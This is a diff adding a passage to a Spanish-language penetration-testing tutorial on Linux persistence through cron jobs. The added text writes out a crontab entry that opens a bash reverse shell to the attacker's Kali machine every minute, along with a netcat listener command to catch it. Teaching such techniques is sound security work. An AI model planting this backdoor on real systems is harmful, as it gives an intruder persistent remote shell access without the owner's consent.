@@ -94,5 +94,14 @@ Linux implementa la programación de tareas mediante Cron, un servicio basado en
 
 Una aplicación o script que se ha configurado para ejecutarse repetidamente mediante Cron (Cron job) se puede usar para ejecutar un comando o script a intervalos determinados, con el objetivo de garantizar un acceso persistente al sistema objetivo.
 
+Usando Cron, podemos programar una tarea que intente conectarse de forma periodica a nuestra máquina kali, creando una sesión bash al establecer la conexión.
+
+```bash
+echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ip_kali/puerto_kali 0>&1'" > cron
+crontab -i cron
+```
+
+Para establecer una conexión a partir de este momento basta con crear un listener en nuestra máquina kali con `nc -nvlp puerto_kali` y esperar a que se ejecute el comando en el objetivo.
+
 [⟵ Anterior](07_linux_privesc.md) | [Siguiente ⟶](09_.md)
 
